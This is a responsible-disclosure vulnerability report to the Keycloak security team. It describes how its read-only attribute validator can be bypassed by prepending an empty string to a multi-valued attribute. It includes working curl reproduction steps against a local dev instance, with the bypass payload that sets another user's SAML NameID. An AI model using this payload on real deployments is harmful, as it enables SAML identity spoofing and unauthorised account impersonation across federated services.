Hi Keycloak Security Team,

I am reporting a vulnerability in Keycloak that allows a regular user to bypass
read-only attribute validation through the Account REST API.

Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
Tested on: Keycloak 999.0.0-SNAPSHOT built from source

AI Disclosure: AI tools were used to assist in drafting this report. The
vulnerability was manually discovered, verified, and reproduced.

DESCRIPTION:
The ReadOnlyAttributeUnchangedValidator compares only the first element of a
multi-valued attribute array. By prepending an empty string to the array, an
unprivileged user can write to read-only attributes such as
saml.persistent.name.id.for.*, which are protected by default.

ROOT CAUSE:
ReadOnlyAttributeUnchangedValidator.java lines 77-96 — the validator checks
inputValue.get(0) against the existing value but does not validate the full
array contents.

REPRODUCTION STEPS:

1. Start Keycloak in dev mode
2. Enable unmanaged attributes:

KC=http://localhost:8084
tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}
T=$(tok)

curl -s -X PUT $KC/admin/realms/master/users/profile \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"unmanagedAttributePolicy":"ENABLED","attributes":[{"name":"username"},{"name":"email"},{"name":"firstName"},{"name":"lastName"}]}'

3. Create test user "mallory":

curl -s -X POST $KC/admin/realms/master/users \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"username":"mallory","enabled":true,"firstName":"M","lastName":"M","credentials":[{"type":"password","value":"mallory","temporary":false}]}'

4. Get mallory's token:

UT=$(curl -s $KC/realms/master/protocol/openid-connect/token \
  -d client_id=admin-cli -d username=mallory -d password=mallory \
  -d grant_type=password \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

5. Normal attempt (blocked — HTTP 400):

curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/realms/master/account/ \
  -H "Authorization: Bearer $UT" \
  -H 'Content-Type: application/json' \
  -d '{"attributes":{"saml.persistent.name.id.for.myapp":["victimNameID123"]}}'

6. Bypass attempt (succeeds — HTTP 204):

curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/realms/master/account/ \
  -H "Authorization: Bearer $UT" \
  -H 'Content-Type: application/json' \
  -d '{"attributes":{"saml.persistent.name.id.for.myapp":["","victimNameID123"]}}'

7. Verify the value was stored:

T=$(tok)
MALLORY_ID=$(curl -s "$KC/admin/realms/master/users?username=mallory" \
  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')
curl -s $KC/admin/realms/master/users/$MALLORY_ID \
  -H "Authorization: Bearer $T" | python3 -m json.tool | grep -A2 saml

Result shows: "saml.persistent.name.id.for.myapp": ["victimNameID123"]

IMPACT:
- SAML identity spoofing across federated services
- Unprivileged user can impersonate another user's SAML NameID
- Bypass of attribute-level access controls

CVSS 3.1: 7.5 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

